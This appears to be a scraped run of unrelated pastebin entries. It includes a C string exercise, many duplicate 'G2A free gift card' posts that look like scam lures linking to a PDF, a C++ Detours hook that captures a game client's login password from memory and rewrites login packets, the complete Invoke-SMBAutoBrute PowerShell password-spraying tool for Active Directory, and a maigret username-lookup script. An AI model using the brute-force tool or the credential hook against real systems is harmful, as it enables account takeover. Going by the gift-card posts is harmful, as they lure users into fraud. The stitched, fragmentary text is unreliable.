        if(str0[i]=='l'){
            if(str0[i+1]=='e'){
                if(str0[i+2]=='m'){
                    if(str0[i+3]=='i'){
                        if(str0[i+4]=='n'){
                            if(str0[i+5]=='s'){
                                if(str0[i+6]=='k'){
                                    if(str0[i+7]=='y'){
                                        printf(""Leminsky disse:\num homem com uma dor, é muito mais interessante\ncaminha assim de lado\ncomo se, chegando atrasado...\nandasse mais adiante!"");
                                    }
                                }    
                            }
                        }
                    }
                }
            }
//            strcat(str1,str0);
        }
    }
//    strcpy(str1,str0);
    setbuf(stdin,NULL);

    printf(""\n\n... and in the str1 it should also read: \n"");
    strcpy(str1,str0);
    for(j=0;j<strlen(str0);j++){
        if(str0[j]=='a'||str0[j]=='e'||str0[j]=='i'||str0[j]=='o'||str0[j]=='u'){
            str1[j-1]='*';
            str1[j]='*';
        }
    }
    fputs(str1,stdout);
    return 0;
    
}
"
hMt9B8dk,🤑G2A.com Free Gift Card Guide June 2024 Fix🤑,Garoam,JavaScript,Sunday 2nd of June 2024 06:18:22 PM CDT,"G2A.com free gift card & gaming guide.
Any voucher for free on G2A.com including Amazon gift cards & all else offered.
This is the most up to date version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
June 2 2024"
2nGZ7bMM,🤑G2A.com Free Gift Card Guide June 2024 Fix🤑,atakan1983,JavaScript,Sunday 2nd of June 2024 05:53:21 PM CDT,"G2A.com complimentary voucher & games guide.
Any gift card for free on G2A.com including Amazon gift cards & all else offered.
This is the most up to date version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
June 2nd 2024"
GEkhKVaN,🤑G2A.com Free Gift Card Guide June 2024 Fix🎁,lookos13,JavaScript,Sunday 2nd of June 2024 05:28:19 PM CDT,"G2A.com complimentary gift card & gaming guide.
Any gift card for free on G2A.com including Amazon gift cards & everything else offered.
This is the most current version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
2nd of June 2024"
5xaVTkx5,Login 7xxx,AMRCODEING,C++,Sunday 2nd of June 2024 05:26:27 PM CDT,"#include ""USERHOOK.h""
#include ""Common.h""

#pragma comment( lib, ""psapi.lib"" )
#pragma comment( lib, ""detours.lib"" )

static BYTE Key1[] = { 99,88,140,22,33,190,244,115,160,191,213,45,241,203,99,230,142,4,19,113,106,59,245,220,169,232,121,79,241,95,193,149 };
static BYTE Key2[] = { 101,110,251,209,129,108,198,113,154,252,111,231,84,199,183,190,57,26,225,218,121,227,232,36,55,224,48,169,254,163,166,43 };
PBYTE JumpPassword = 0, PasswordPointer;
int  SizePassword = 0, SizeServer = 0, SizeUsername = 0;
char szPassword[32], szUser[32], szServer[32];
DWORD ForwardAddress = Memory::FindPattern(""Conquer.exe"", ""\xE8\x00\x00\x00\x00\x83\xC4\x0C\x83\x4D\xFC\xFF\xFF\x75\x0C"", ""x????xxxxxxxxxx"");
DWORD RecvAddress = Memory::FindPattern(""Conquer.exe"", ""\x6A\x08\xB8\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x83\x7D\x08\x00\x0F\x84\x00\x00\x00\x00"", ""xxx????x????xxxxxx????"");
DWORD UserAddress = Memory::FindPattern(""Conquer.exe"", ""\x55\x81\xEC\x00\x00\x00\x00\x8D\x6C\x24\xFC\xA1\x00\x00\x00\x00\x33\xC5\x89\x85\x00\x00\x00\x00\x68\x00\x00\x00\x00\xB8\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x8B\xBD\x00\x00\x00\x00\x8B\xB5"", ""xxx????xxxxx????xxxx????x????x????x????xx????xx"");
DWORD SendAddress = Memory::FindPattern(""Conquer.exe"", ""\x55\x8D\xAC\x24\x00\x00\x00\x00\xB8\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x6A\xFF\x68\x00\x00\x00\x00\x64\xA1\x00\x00\x00\x00\x50\x83\xEC\x10\xA1\x00\x00\x00\x00\x33\xC5\x89\x85\x00\x00\x00\x00\x53\x56\x57\x50\x8D\x45\xF4\x64\xA3\x00\x00\x00\x00\x89\x65\xF0"", ""xxxx????x????x????xxx????xx????xxxxx????xxxx????xxxxxxxxx????xxx"");

void* sock_add = 0;
void* Ecx = 0;
UINT32 Identifier = 0, State = 0;
HookStub _SRecv;

void PrintPass()
{
	sprintf(szPassword, ""%s"", PasswordPointer);
	SizePassword = strlen(szPassword);
}

_declspec(naked) VOID WINAPI FunctionPass()
{
	__asm mov dword ptr ds : [PasswordPointer], eax
	__asm pushad
	__asm popad
	__asm mov dword ptr ss : [ebp - 0xC], eax
	__asm mov ecx, dword ptr ss : [ebp - 0xC]
	__asm call PrintPass
	__asm jmp dword ptr ds : [JumpPassword]
}

_declspec(naked) VOID WINAPI MYJMPPASS()
{
	__asm jmp FunctionPass
}


typedef signed int(__cdecl* _u)(char* Str, int a2, int a3, int a4, char* a5, void* a6, void* a7, int a8, int a9, char* a10, int a11);
signed int __cdecl _User(char* Str, int a2, int a3, int a4, char* a5, void* a6, void* a7, int a8, int a9, char* a10, int a11)
{
	DWORD PasswordAddress = Memory::FindPattern(""TQPlat.dll"", ""\x89\x45\xF4\x8B\x4D\xF4\x83\xC1\x01"", ""xxxxxxxxx"");
	if (PasswordAddress != NULL) {
		Memory::WriteMemory(PasswordAddress + 1, MYJMPPASS, 6);

		BYTE buffer[] = { JMP_OPCODE }; // jmp
		WriteProcessMemory(GetCurrentProcess(), (PBYTE)(PasswordAddress), &buffer, sizeof(buffer), NULL);
		DWORD CallDatinter = PasswordAddress + 1;
		DWORD dword;
		VirtualProtect((VOID*)CallDatinter, 4, PAGE_EXECUTE_READWRITE, &dword);
		PasswordPointer = (PBYTE)PasswordAddress - (0xFFFFFFFF - CallDatinter) + 4;
		CallDatinter = (DWORD)FunctionPass - PasswordAddress + 0xFFFFFFFF - 4;
		WriteProcessMemory(GetCurrentProcess(), (VOID*)(PasswordAddress + 1), &CallDatinter, sizeof(CallDatinter), NULL);

		BYTE bufferNop[] = { NOP_OPCODE };
		WriteProcessMemory(GetCurrentProcess(), (VOID*)(PasswordAddress + 5), &bufferNop, sizeof(bufferNop), NULL);
		JumpPassword = (PBYTE)PasswordAddress + 6;
	}
	sprintf(szUser, ""%s"", Str);
	SizeUsername = strlen(szUser);
	sprintf(szServer, ""%s"", (char*)a5);
	SizeServer = strlen(szServer);
	_u originalTQ = (_u)UserAddress;
	return originalTQ(Str, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11);
}

typedef signed int(__cdecl* _r)(int a1, signed int a2);
signed int WINAPIV _Recv(int a1, signed int a2) {
	INT length = *(UINT16*)(a1);
	int packetid = *(UINT16*)(a1 + 2);
	if (packetid == 1637)
	{
		Identifier = *(UINT32*)(a1 + 4);
		State = *(UINT32*)(a1 + 12);
	}
	using __Recv = signed int(WINAPIV *)(int, signed int);
	return ((__Recv)_SRecv.Address)(a1, a2);
}

typedef signed int(__thiscall* _s)(void*, int, int);
signed int __fastcall _Send(void* a1, void* ecx, int a2, signed int a3)
{
	sock_add = a1;
	Ecx = ecx;
	int packetid = *(UINT16*)(a2 + 2);
	if (packetid == 1942)
	{
		*(UINT16*)(a2 + 2) = 61120;//Packet ID
		*(BYTE*)(a2 + 4) = (BYTE)SizeUsername;
		*(BYTE*)(a2 + 5) = (BYTE)SizePassword;
		*(BYTE*)(a2 + 6) = (BYTE)SizeServer;
		sprintf((char*)(a2 + 10), ""%s"", szUser);
		sprintf((char*)(a2 + 10 + SizeUsername), ""%s"", szPassword);
		for (BYTE x = 0; x < SizePassword; x++)
		{
			*(BYTE*)(a2 + 10 + SizeUsername + x) = (BYTE)(*(BYTE*)(a2 + 10 + SizeUsername + x) ^ Key1[x * 44 % 32]);
			*(BYTE*)(a2 + 10 + SizeUsername + x) = (BYTE)(*(BYTE*)(a2 + 10 + SizeUsername + x) ^ Key2[x * 99 % 32]);
		}
		sprintf((char*)(a2 + 10 + SizeUsername + SizePassword), ""%s"", szServer);	
	}
	if (packetid == 2065)
	{
		*(UINT*)(a2 + 4) = Identifier;
		*(UINT*)(a2 + 8) = State;
	}
	_s originalTQ = (_s)SendAddress;
	return originalTQ(a1, a2, a3);
}
void USERHOOK::Init()
{
	
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourAttach(&(LPVOID&)UserAddress, _User);
	if (DetourTransactionCommit() != NO_ERROR)
	{
		exit(0);
		return;
	}


	/*DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourAttach(&(LPVOID&)RecvAddress, _Recv);
	if (DetourTransactionCommit() != NO_ERROR)
	{
		exit(0);
		return;
	}*/
	_SRecv.Size = 7;
	Memory::CreateHook((VOID*)RecvAddress, _Recv, &_SRecv);

	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourAttach(&(LPVOID&)SendAddress, _Send);
	if (DetourTransactionCommit() != NO_ERROR)
	{
		exit(0);
		return;
	}


	BYTE buffer2[] = { 0x90, 0x90, 0x90, 0x90 };
	WriteProcessMemory(GetCurrentProcess(), (VOID*)(ForwardAddress), &buffer2, sizeof(buffer2), NULL);
	WriteProcessMemory(GetCurrentProcess(), (VOID*)(ForwardAddress + 1), &buffer2, sizeof(buffer2), NULL);
}



DWORD PasswordAddress = Memory::FindPattern(""TQPlat.dll"", ""\x89\x45\xF4\x8B\x4D\xF4\x83\xC1\x01"", ""xxxxxxxxx"");
DWORD ForwardAddress = Memory::FindPattern(""Conquer.exe"", ""\xE8\x00\x00\x00\x00\x83\xC4\x0C\x83\x4D\xFC\xFF\xFF\x75\x0C"", ""x????xxxxxxxxxx"");
DWORD rHASH = Memory::FindPattern(""Conquer.exe"",""\x6A\x08\xB8\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x83\x7D\x08\x00\x0F\x84\x00\x00\x00\x00"",""xxx????x????xxxxxx????"");
DWORD uHASH = Memory::FindPattern(""Conquer.exe"",""\x55\x81\xEC\x00\x00\x00\x00\x8D\x6C\x24\xFC\xA1\x00\x00\x00\x00\x33\xC5\x89\x85\x00\x00\x00\x00\x68\x00\x00\x00\x00\xB8\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x8B\xBD\x00\x00\x00\x00\x8B\xB5"",""xxx????xxxxx????xxxx????x????x????x????xx????xx"");
DWORD sHASH = Memory::FindPattern(""Conquer.exe"",""\x55\x8D\xAC\x24\x00\x00\x00\x00\xB8\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x6A\xFF\x68\x00\x00\x00\x00\x64\xA1\x00\x00\x00\x00\x50\x83\xEC\x10\xA1\x00\x00\x00\x00\x33\xC5\x89\x85\x00\x00\x00\x00\x53\x56\x57\x50\x8D\x45\xF4\x64\xA3\x00\x00\x00\x00\x89\x65\xF0"",""xxxx????x????x????xxx????xx????xxxxx????xxxx????xxxxxxxxx????xxx""); "
a26CdhZe,Untitled,Lebarra,PowerShell,Sunday 2nd of June 2024 05:19:46 PM CDT,"function Invoke-SMBAutoBrute
{
<#
.SYNOPSIS

    Performs smart brute forcing of accounts against the current domain, ensuring that
	lockouts do not occur.

    Author: Jason Lang (@curi0usJack)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
    Version: 1.0

.DESCRIPTION

    This script takes either a list of users or, if not specified, will query the domain 
	for a list of users on every brute attempt. The users queried will have a badPwdCount 
	attribute of two less than the LockoutThreshold to ensure they are not locked in the brute
	attempt, with a new list being queried for every attempt. Designed to simply input the 
	LockoutThreshold as well as a password list and then run. Note that each DC is queried
	for bad password count for each user for each brute, so this script is noisy.

.EXAMPLE

    PS C:\> Invoke-SMBAutoBrute -PasswordList ""jennifer, yankees"" -LockoutThreshold 3

	[*] Performing prereq checks.
	[*] PDC: LAB-2008-DC1.lab.com
	[*] Passwords to test: jennifer, yankees, 123456
	[*] Initiating brute. Unless -ShowVerbose was specified, only successes will show...
	[+] Success! Username: TestUser6. Password: jennifer
	[+] Success! Username: TestUser99. Password: yankees
	[*] Completed.

.PARAMETER UserList

	A text file of userids (one per line) to brute. Do not append DOMAIN\ in front of the userid.
	If this parameter is not specified, the script will retrieve a new list of user accounts for
	each attempt to ensure accounts are not locked.
	
.PARAMETER PasswordList

	A comma separated list of passwords to attempt. 
	
.PARAMETER LockoutThreshold

	The domain setting that specifies the number of bad login attempts before the account locks.
	To discover this, open a command prompt from a domain joined machine and run ""net accounts"".
	
.PARAMETER Delay

	The delay time (in milliseconds) between each brute attempt. Default 100.
	
.PARAMETER ShowVerbose

	Will display Failed as well as Skipped attempts. Generates a ton of data.
	
.PARAMETER StopOnSuccess

	The script will exit after the first successful authentication.

#>
    [CmdletBinding()] Param(
        [Parameter(Mandatory = $False)]
        [String] $UserList,

        [parameter(Mandatory = $True)]
        [String] $PasswordList,

        [parameter(Mandatory = $True)]
        [String] $LockoutThreshold,

        [parameter(Mandatory = $False)]
        [int] $Delay,

        [parameter(Mandatory = $False)]
        [Switch] $ShowVerbose,

        [parameter(Mandatory = $False)]
        [Switch] $StopOnSuccess
    )

    Begin
    {
        Set-StrictMode -Version 2

        Try {Add-Type -AssemblyName System.DirectoryServices.AccountManagement}
        Catch {Write-Error $Error[0].ToString() + $Error[0].InvocationInfo.PositionMessage}

        Try {Add-Type -AssemblyName System.DirectoryServices}
        Catch {Write-Error $Error[0].ToString() + $Error[0].InvocationInfo.PositionMessage}

        function Get-PDCe()
        {
            $context = new-object System.DirectoryServices.ActiveDirectory.DirectoryContext(""Domain"",""lab.com"")
            $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($context)
            return $domain.pdcRoleOwner
        }

        function Get-UserList($maxbadpwdcount)
        {
            $users = New-Object System.Collections.ArrayList
            $counttouse = $maxbadpwdcount - 2 # We have to use <= in our LDAP query. Use - 2 attempts to ensure the accounts are not locked with this attempt.
            $de = New-Object System.DirectoryServices.DirectoryEntry ""LDAP://$pdc""
            $search = New-Object System.DirectoryServices.DirectorySearcher $de
            $search.Filter = ""(&(objectclass=user)(badPwdCount<=$counttouse)(!userAccountControl:1.2.840.113556.1.4.803:=2))"" #UAC = enabled accounts only
            $search.PageSize = 10
            $foundusers = $search.FindAll()
            if ($foundusers -ne $null)
            {
                foreach ($u in $foundusers)
                {
                    $users.Add([string]$u.Properties['samaccountname']) | Out-Null
                }
            }
            return $users
        }

        function Get-DomainControllers
        {
            $dcs = New-Object System.Collections.ArrayList
            $filter = ""(&(objectclass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))""
            $de = New-Object System.DirectoryServices.DirectoryEntry ""LDAP://$pdc""
            $search = New-Object System.DirectoryServices.DirectorySearcher $de
            $search.Filter = $filter
            $search.PropertiesToLoad.Add('CN') | Out-Null
            $results = $search.FindAll()
            foreach ($item in $results)
            {
                $dcs.Add($item.Properties['cn']) | Out-Null
            }
            $search = $null
            $de.Dispose()
            return $dcs
        }

        function Get-DCBadPwdCount($userid, $dc)
        {
            $count = -1
            $de = New-Object System.DirectoryServices.DirectoryEntry ""LDAP://$dc""
            $search = New-Object System.DirectoryServices.DirectorySearcher $de
            $search.Filter = ""(&(objectclass=user)(samaccountname=$userid))""
            $search.PropertiestoLoad.Add('badPwdCount') | Out-Null
            $user = $search.FindOne()
            if ($user -ne $null)
            {
                $count = $user.Properties['badpwdcount']
            }
            $search = $null
            $de.Dispose()
            return $count
        }

        function Get-UserBadPwdCount($userid, $dcs)
        {
            # The badPwdCount attribute is not replicated. Attempts should be reported back to the PDC,
            # but here get the greatest count from amongst all the DCs to guard against replication errors.
            $totalbadcount = -1
            foreach ($dc in $dcs)
            {
                $badcount = Get-DCBadPwdCount $userid $dc
                if ($badcount -gt $totalbadcount)
                {
                    $totalbadcount = $badcount
                }
            }
            return $totalbadcount
        }
    }

    Process
    {
        $validaccounts = @{}

        $userstotest = $null
        Write-Host ""`n[*] Performing prereq checks.""
        if ([String]::IsNullOrEmpty($UserList) -eq $false)
        {
            if ([System.IO.File]::Exists($UserList) -eq $false)
            {
                ""[!] $UserList not found. Aborting.`n""
                exit
            }
            else
            {
                $userstotest = Get-Content $UserList
            }
        }

        $pdc = Get-PDCe

        if ($pdc -eq $null)
        {
            Write-Host ""[!] Could not locate domain controller. Aborting.""
            exit
        }

        Write-Host ""[*] PDC: $pdc""
        Write-Host ""[*] Passwords to test: $PasswordList""

        $dcs = Get-DomainControllers
        $ContextType = [System.DirectoryServices.AccountManagement.ContextType]::Domain
        $PrincipalContext = New-Object System.DirectoryServices.AccountManagement.PrincipalContext($ContextType, $pdc)

        $pwds = New-Object System.Collections.ArrayList
        foreach ($pwd in $PasswordList.Split(','))
        {
            $pwds.Add($pwd.Trim(' ')) | Out-Null
        }

        Write-Host ""[*] Initiating brute. Unless -ShowVerbose was specified, only successes will show...""
        foreach ($p in $pwds)
        {
            if ($userstotest -eq $null)
            {
                $userstotest = Get-UserList $LockoutThreshold
            }

            foreach ($u in $userstotest)
            {
                $userid = $u.Trim(' ').Trim([Environment]::Newline)
                if ($validaccounts.ContainsKey($userid) -eq $false)
                {
                    $attempts = Get-UserBadPwdCount $userid $dcs
                    
                    #Be sure to use 2 less than the LockoutThresold so the account will not be locked out as a result of the next test.
                    if ($attempts -ne -1 -and $attempts -le ($LockoutThreshold - 2)) 
                    {
                        $IsValid = $false
                        $IsValid = $PrincipalContext.ValidateCredentials($userid, $p).ToString()

                        if ($IsValid -eq $True)
                        {
                            Write-Host ""[+] Success! Username: $userid. Password: $p""
                            $validaccounts.Add($userid, $p)
                            if ($StopOnSuccess.IsPresent)
                            {
				Write-Host ""[*] StopOnSuccess. Exiting.`n""
                                exit
                            }
                        }
                        else
                        {
                            if ($ShowVerbose.IsPresent)
                            {
                                Write-Host ""[-] Failed. Username: $userid. Password: $p. BadPwdCount: $($attempts + 1)""
                            }
                        }

                        if ($Delay)
                        {
                            Start-Sleep -m $Delay
                        }
                        else
                        {
                            Start-Sleep -m 100
                        }
                    }
                    else
                    {
                        if ($ShowVerbose.IsPresent)
                        {
                            Write-Host ""[-] Skipped. Username: $userid. Password: $p. BadPwdCount: $attempts""
                        }
                    }
                }
            }
        }
        Write-Host ""[*] Completed.`n""
    }
}
"
52gq5HX7,🤑G2A.com Free Gift Card Guide June 2024 Fix🤑,vivek599,JavaScript,Sunday 2nd of June 2024 05:03:17 PM CDT,"G2A.com free voucher & games guide.
Any gift card for free on G2A.com including Playstation gift cards & anything else offered.
This is the most up to date version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
2nd of June 2024"
D03phCiW,🤑G2A.com Free Gift Card Guide June 2024 Fix🎁,ColtM4A2,JavaScript,Sunday 2nd of June 2024 04:38:16 PM CDT,"G2A.com free voucher & games guide.
Any voucher for free on G2A.com including Playstation gift cards & anything else offered.
This is the most up to date version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
2nd of June 2024"
DmmzqWhY,Untitled,Mysoft,FreeBasic,Sunday 2nd of June 2024 04:37:35 PM CDT,"#include ""MyTDT\fbplay2.bas""

play ""P64""

dim as double TMR = timer
play ""L4CC""
print timer-TMR

TMR = timer
play ""L6CCC""
print timer-TMR

TMR = timer
play ""L8CCCC""
print timer-TMR

TMR = timer
play ""L16CCCCCCCC""
print timer-TMR

TMR = timer
play ""L32CCCCCCCCCCCCCCCC""
print timer-TMR

TMR = timer
play ""L64CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC""
print timer-TMR
"
MPaH3vLy,🤑G2A.com Free Gift Card Guide June 2024 Fix🤑,Skarface-MKL,JavaScript,Sunday 2nd of June 2024 04:13:13 PM CDT,"G2A.com complimentary voucher & games guide.
Any gift card for free on G2A.com including Steam gift cards & anything else offered.
This is the most up to date version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
June 2 2024"
QDCK2xx0,Untitled,hiippiie,Python,Sunday 2nd of June 2024 03:50:40 PM CDT,"import asyncio
import logging
import sys

import maigret
from maigret.result import QueryStatus

logging.getLogger('asyncio').setLevel(logging.WARNING)


MAIGRET_DB_FILE = 'https://raw.githubusercontent.com/soxoj/maigret/main/maigret/resources/data.json'
TOP_SITES_COUNT = 1500 
TIMEOUT = 5 


def setup_logger(log_level, name):
    for lib in ['requests', 'urllib3']:
        logging.getLogger(lib).setLevel(logging.WARNING) # change to debug
    logger = logging.getLogger(name)
    logger.setLevel(log_level)
    return logger


async def maigret_search(username):
    logger = setup_logger(logging.WARNING, 'maigret')
    db = maigret.MaigretDatabase().load_from_path(MAIGRET_DB_FILE)
    sites = db.ranked_sites_dict(top=TOP_SITES_COUNT)

    results = await maigret.search(username=username,
                                   site_dict=sites,
                                   timeout=TIMEOUT,
                                   max_connections=5, # max concurrent connection - default is 100
                                   is_parsing_enabled=True,
                                   logger=logger,
                                   no_progressbar=True, # change to debug
                                   query_notify=None, # change to debug
                                   )
    return results


def get_maigret_data(username):
    loop = asyncio.get_event_loop()
    results = loop.run_until_complete(maigret_search(username))

    res = {}
    for site, data in results.items():
        if data['status'].status != QueryStatus.CLAIMED:
            continue

        res[site] = data

    return res


if __name__ == '__main__':
    print(get_maigret_data('TESTUSERNAME'))
"
a8hp3yie,🤑G2A.com Free Gift Card Guide June 2024 Fix🎁,thepplayz,JavaScript,Sunday 2nd of June 2024 03:48:10 PM CDT,"G2A.com free voucher & games guide.
Any gift card for free on G2A.com including Steam gift cards & anything else offered.
This is the most latest version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
June 2nd 2024"
y4L6Vz5b,🤑G2A.com Free Gift Card Guide June 2024 Fix🤑,sirmikey,JavaScript,Sunday 2nd of June 2024 03:23:09 PM CDT,"G2A.com complimentary gift card & gaming guide.
Any gift card for free on G2A.com including Steam gift cards & everything else offered.
This is the most latest version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
2nd of June 2024"
nmdTiDbX,Unnamed Main Screen,E-Kemp,Lua,Sunday 2nd of June 2024 03:23:04 PM CDT,"modem = peripheral.wrap(""left"")
chat = peripheral.wrap(""chat_box_0"")
radar = peripheral.wrap(""radar_0"")
driveLoc = disk.getMountPath(""drive_0"")
monitor = peripheral.wrap(""top"")

players = {}

-- Render Function
function render()
  term.clear()
  term.setCursorPos(1, 1)
  print(""Welcome to >>"")
  write(""              Elli"")
  term.setTextColor(colors.purple)
  print(""OS"")
  term.setTextColor(colors.white)
  print(""\n--------------\n"")
  print(""Players present:"")
  if next(players) ~= nil then
    local day = os.day()
    for k, v in pairs(players) do
      print(""   > ""..v.name)
    end
  else
    print(""    None"")
  end
  print(""\n--------------\n"")
end

function monitor_render()
  local x, y = monitor.getSize()

  monitor.clear()
  monitor.setTextScale(0.5)
  monitor.setCursorPos(1, 1)
  monitor.write("">> Elli"")
  monitor.setTextColor(colors.purple)
  monitor.write(""OS"")
  monitor.setTextColor(colors.white)
  for i = 1, x do
    monitor.setCursorPos(i, 2)
    monitor.write(""-"")
  end
  monitor.setCursorPos(1, 4)
  monitor.write(""Players:"")
  for i, v in pairs(players) do
    monitor.setCursorPos(1, i+4)
    monitor.write(i.."": ""..v.name)
  end
end

while true do
  players = radar.getPlayers()
  monitor_render()
  render()
  os.sleep(1)
end


-- Listen for events
"
3EFptMxp,Набор текста голосом,egor230,Python,Sunday 2nd of June 2024 03:22:21 PM CDT,"'''Данный скрипт предназначен для распознавания речи с использованием микрофона, автоматической замены произнесенных слов на заранее заданные и последующей печати текста с помощью симулированной клавиатуры. Он также включает функции по управлению вводом с микрофона и настройкой эквалайзера для улучшения качества звука.
'''
import json, os, re, subprocess, time, threading, sys, audioop
import speech_recognition as sr
from pywinauto import keyboard
from pynput.keyboard import Key, Controller
from pynput import *
class save_key:
  def __init__(self):
    self.text = """"
    self.flag = False
    self.word=[]
    self.res={}
    self.new_res={}
  def save_text(self, text):
    self.text = text
  def get_text(self):
    return self.text
  def get_flag(self):
    return self.flag

  def set_flag(self, value):
    self.flag = value

  def update_dict(self):
   data = ""/mnt/807EB5FA7EB5E954/софт/виртуальная машина/linux must have/python_linux/Project/list for replacements.json""  # файл настроек.
   if os.path.exists(data):  # есть ли этот файл.
    with open(data, encoding=""cp1251"") as json_file:  # загрузка настроек из файла.
     self.res = json.load(json_file)     # проходимся по каждому элементу словаря
     for key in self.res.keys():    # Если ключ содержит '*', добавляем его в новый словарь
      if '*' in key:
       self.new_res[key] = self.res[key]
     for key in self.new_res.keys():
      del self.res[key]

  def get_dict(self):# словарь без *
     return self.res

  def get_new_dict(self):# словарь с *
     return self.new_res

  def save_words(self, w):
     self.word.clear()
     for i in w:
      self.word.append(i)

  def get_words(self):
     return self.word
k=save_key()
k.update_dict()
def replace(match):
  res=k.get_dict()
  return res[match.group(0)]
class save_ln:
  def __init__(self):
    self.text = """"
  def save_text(self, text):
    self.text = text
  def get_text(self):
      return self.text
def typing_text(char1):#  delay = 0.0001  # Задайте здесь нужную задержку в секундах
  for char in char1:
    script = f'''#!/bin/bash
    word=""{char}""  # Задайте здесь нужное слово  # Задайте здесь нужную задержку в секундах
    if [[ -z ""$word"" ]]; then
      xte ""key space""
    else
    xdotool type  ""$word""
    fi
    '''
    subprocess.call(['bash', '-c', script, '_'])

def repeat(text, k):
  k.save_text(text)
  text1=""""
  res=k.get_dict()
  k.save_words(res)
  words=k.get_words()
  for i in words:
     text = k.get_text()
     reg = r'\b' + r'\b|\b'.join([i]) + r'\b'
     text1 = re.sub(reg, replace, text)
     k.save_text(text1)
  new_res= k.get_new_dict()
  for word, i in new_res.items():
      text = k.get_text()
      pattern = re.compile(re.escape(word), re.IGNORECASE)
      text1 = pattern.sub(i, text)
      k.save_text(text1)
  return text1

# Подавление вывода ошибок
class NoALSAErrorOutput:
  def __enter__(self):
    self._stderr = sys.stderr
    sys.stderr = open(os.devnull, 'w')

  def __exit__(self, exc_type, exc_val, exc_tb):
    sys.stderr.close()
    sys.stderr = self._stderr


with NoALSAErrorOutput():
  mic = sr.Microphone()

# Создаем экземпляр класса распознавания
r = sr.Recognizer()

# Настройки микрофона
mic = sr.Microphone()

# Начальная настройка микрофона для снижения уровня шума
with mic as source:
  r.adjust_for_ambient_noise(source)
def on_press(key):  # обработчик клави. # print(key )
 key=str(key).replace("" "","""")
 if key == ""Key.shift_r"":
   # print(""okl"")
   k.set_flag(True)
   return True
 if key == ""Key.space"":
   k.set_flag(False)
   return True
 else:
  return True
def on_release(key):
 pass
 return True
def a():
  while 1:
    with keyboard.Listener(on_release=on_release, on_press=on_press) as listener:
      listener.join()

def apply_pulseaudio_equalizer():
  # Применение эквалайзера с использованием PulseAudio
  subprocess.run(['pactl', 'load-module', 'module-equalizer-sink', 'sink_name=equalizer'])
  subprocess.run(
    ['pactl', 'load-module', 'module-ladspa-sink', 'sink_name=ladspa_equalizer', 'sink_properties=device.description=Equalized_Sink', 'master=equalizer', 'plugin=mbeq_1197',
     'label=mbeq', 'control=6.0,6.0,4.5,0.0,0.0,0.0,0.0,0.0,4.5,7.0,8.5,10.0,12.0,8.5,6.0'])


# Подавление вывода ошибок ALSA
class NoALSAErrorOutput:
    def __enter__(self):
        self._stderr = sys.stderr
        sys.stderr = open(os.devnull, 'w')

    def __exit__(self, exc_type, exc_val, exc_tb):
        sys.stderr.close()
        sys.stderr = self._stderr

def get_mic_sources_pa():# Получение списка источников ввода
    result = subprocess.run(['pactl', 'list', 'sources', 'short'], stdout=subprocess.PIPE)
    return result.stdout.decode()

def set_mic_volume_pa(source_name, volume_percentage):# Установить уровень громкости микрофона через PulseAudio
    subprocess.run(['pactl', 'set-source-volume', source_name, f'{volume_percentage}%'])

mic_sources = get_mic_sources_pa()# Получение информации о устройствах ввода с помощью PulseAudio
# Переключитесь для вашего источника
source_name = ""alsa_input.usb-046d_HD_Webcam_C525_79588C20-00.mono-fallback""
volume_level = 50  # Процент громкости
set_mic_volume_pa(source_name, volume_level)# Установка уровня громкости микрофона

def recognize_speech():
  with mic as source:
    while 1:
      try:
        print(""Скажите что-нибудь..."")
        audio = r.listen(source)          # Обработка аудио данных или передача в распознаватель речи
        text = r.recognize_google(audio, language=""ru-RU"")# Распознаем услышанное при помощи Google Web Speech API
        text = str(text.lower()) + str("" "")
        print(text)
        if k.get_flag() == True:
          k.set_flag(False)
          text0 = text[0].upper() + text[1:]
          typing_text(text0)  #(text0)
        else:
          typing_text(text)  #(text)
      except sr.UnknownValueError:
        print(""Google Web Speech API не смог распознать аудио"")
      except sr.RequestError as e:
        print(f""Could not request results from Google Web Speech API; {e}"")

# Запуск потока для непрерывного прослушивания
apply_pulseaudio_equalizer()
listening_thread = threading.Thread(target=recognize_speech)
listening_thread.start()
t1 = threading.Thread(target=a)
t1.start()
while True:
  pass
"
67f9hpAB,🤑G2A.com Free Gift Card Guide June 2024 Fix🎁,dustinction,JavaScript,Sunday 2nd of June 2024 02:58:08 PM CDT,"G2A.com free voucher & gaming guide.
Any gift card for free on G2A.com including Steam gift cards & all else offered.
This is the most up to date version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
June 2 2024"
WbCwRKxJ,so totally snowy,coinwalk,JavaScript,Sunday 2nd of June 2024 02:36:13 PM CDT,"var elderly = parseFloat(document.getElementById('pct_balance').value);
